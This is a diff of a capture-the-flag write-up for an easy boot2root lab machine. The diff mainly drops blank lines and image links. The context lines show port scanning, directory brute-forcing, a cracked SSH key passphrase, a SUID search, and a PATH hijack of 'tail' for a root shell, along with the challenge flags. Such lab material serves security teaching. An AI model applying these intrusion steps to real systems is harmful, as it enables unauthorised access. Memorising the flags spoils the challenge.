@@ -4,7 +4,6 @@ Easy boot2root Machine
 
 ![](https://i.imgur.com/egCv6YT.png)
 
-
 ```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ rustscan -a 10.10.95.182 --ulimit 5000 -b 65535 -- -A 
@@ -25,7 +24,6 @@ ________________________________________
 Open 10.10.95.182:22
 Open 10.10.95.182:80
 Open 10.10.95.182:8765
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ feroxbuster --url http://10.10.95.182 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403 
@@ -77,7 +75,6 @@ now log in http://10.10.95.182:8765
 </script>
 
  <!-- Barry, you can now SSH in using your key!-->
-
 
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ wget http://10.10.95.182:8765/auth/dontforget.bak
@@ -190,7 +187,6 @@ urieljames       (key)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
-
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ chmod 600 key      
                                                                                                            
@@ -212,8 +208,6 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
 16 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
 
-
-
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
@@ -227,7 +221,6 @@ barry@mustacchio:~$ cat user.txt
 62d77a4d5f97d47c5aa38b3b2651b831
 
 priv esc
-
 
 barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
@@ -340,7 +333,6 @@ __cxa_finalize@@GLIBC_2.2.5
 .bss
 .comment
 
-
 hijacking -> tail command that invokes /bin/bash so root
 
 barry@mustacchio:~$  cd /tmp
@@ -352,14 +344,7 @@ root@mustacchio:/tmp# cd /root
 root@mustacchio:/root# cat root.txt
 3223581420d906c4dd1a5f9b530393a5
 
-
 ```
-
-![[Pasted image 20220922120840.png]]
-![[Pasted image 20220922121259.png]]
-
-![[Pasted image 20220922122359.png]]
-![[Pasted image 20220922122410.png]]
 
 What is the user flag?
  Check the source of the page
